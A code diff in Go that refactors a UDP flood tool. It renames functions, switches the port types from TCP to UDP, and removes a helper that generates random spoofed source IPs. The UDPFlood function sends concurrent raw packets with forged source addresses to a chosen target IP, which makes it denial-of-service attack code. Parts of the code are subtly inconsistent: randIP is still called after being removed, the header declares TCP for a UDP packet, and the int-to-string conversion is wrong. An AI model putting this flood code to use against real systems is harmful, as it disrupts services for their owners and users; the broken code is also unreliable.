@@ -12,17 +12,6 @@ import (
 	"golang.org/x/net/ipv4"
 )
 
-// generates a fake IP address
-// returns string
-func randIP() string {
-	var fakeIP string
-	fakeIP += string(rand.Intn(255)) + "."
-	fakeIP += string(rand.Intn(255)) + "."
-	fakeIP += string(rand.Intn(255)) + "."
-	fakeIP += string(rand.Intn(255))
-	return fakeIP
-}
-
 func randomPayload() string {
 	// just a bunch of random numbers added into a string
 	// supposed to be random noise for the payload
@@ -36,7 +25,7 @@ func randomPayload() string {
 
 // makes the UDP packet with a spoofed source IP and source port
 // returns net/ipv4 header and bytes of tcp packet
-func makePacket(destPortSrc int, destIP net.IP) (*ipv4.Header, []byte) {
+func udpMakePacket(destPortSrc int, destIP net.IP) (*ipv4.Header, []byte) {
 	// the IP packet
 	ipPacket := layers.IPv4{
 		SrcIP:    net.ParseIP(randIP()),
@@ -46,8 +35,8 @@ func makePacket(destPortSrc int, destIP net.IP) (*ipv4.Header, []byte) {
 		Protocol: layers.IPProtocolTCP,
 	}
 
-	destPort := layers.TCPPort(destPortSrc)
-	srcPort := layers.TCPPort(rand.Intn(65535)) // 2^16 possible ports
+	destPort := layers.UDPPort(destPortSrc)
+	srcPort := layers.UDPPort(rand.Intn(65535)) // 2^16 possible ports
 
 	// tcp syn packet
 	udpPacket := layers.UDP{
@@ -67,12 +56,12 @@ func makePacket(destPortSrc int, destIP net.IP) (*ipv4.Header, []byte) {
 	ipHeaderBuffer := gopacket.NewSerializeBuffer()
 	err := ipPacket.SerializeTo(ipHeaderBuffer, sOpts)
 	if err != nil {
-		handleErr(err)
+		udpHandleErr(err)
 	}
 
 	ipHeader, err := ipv4.ParseHeader(ipHeaderBuffer.Bytes())
 	if err != nil {
-		handleErr(err)
+		udpHandleErr(err)
 	}
 
 	udpBuffer := gopacket.NewSerializeBuffer()
@@ -95,15 +84,15 @@ func UDPFlood(destIPStr string, totalPacketToSend int) {
 		// this can happen concurrently
 		go func(udpPorts []int, destIP net.IP) {
 			// making the packet with a random port from list and dest IP
-			ipHeader, packetBytes := makePacket(udpPorts[rand.Intn(len(udpPorts))], destIP)
+			ipHeader, packetBytes := udpMakePacket(udpPorts[rand.Intn(len(udpPorts))], destIP)
 			packetConn, err := net.ListenPacket("udp4", destIPStr)
 			if err != nil {
-				handleErr(err)
+				udpHandleErr(err)
 			}
 
 			rawConn, err := ipv4.NewRawConn(packetConn)
 			if err != nil {
-				handleErr(err)
+				udpHandleErr(err)
 			}
 
 			rawConn.WriteTo(ipHeader, packetBytes, nil)
@@ -115,6 +104,6 @@ func UDPFlood(destIPStr string, totalPacketToSend int) {
 
 }
 
-func handleErr(message error) {
+func udpHandleErr(message error) {
 	fmt.Println("UDPFLOOD error: " + message.Error())
 }
